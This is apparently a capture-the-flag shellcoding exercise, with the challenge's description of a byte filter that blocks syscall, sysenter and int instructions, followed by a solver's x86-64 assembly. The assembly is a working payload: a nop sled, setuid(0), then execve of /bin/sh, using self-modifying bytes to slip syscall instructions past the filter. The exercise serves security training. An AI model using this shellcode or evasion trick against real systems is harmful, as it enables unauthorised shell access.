This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

[LEAK] Mapping shellcode memory at 0x1c4f4000!
Reading 0x2000 bytes from stdin.

Executing filter...

This challenge requires that your shellcode does not have any `syscall`, 'sysenter', or `int` instructions. System calls
are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05
(`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to
insert the `syscall` instructions at runtime.

Removing write permissions from first 4096 bytes of shellcode.

This challenge is about to execute the following shellcode:


.global _start
.intel_syntax noprefix
_start: 

    .rept 0x1000 //4096 = 1000 in hex
    nop
    .endr

    mov rcx, 0x80
    mov rax, 105
    mov rdi, 0
    inc byte ptr [rip+evil+1]
    inc byte ptr [rip+evil]

    evil:
        .byte 0x0e
        .byte 0x04

    mov rax, 59
    lea rdi, [rip+binsh]
    mov rsi,0
    mov rdx,0
    inc byte ptr [rip+evill+1]
    inc byte ptr [rip+evill]

    evill:
        .byte 0x0e
        .byte 0x04

binsh: 
    .string "/bin/sh"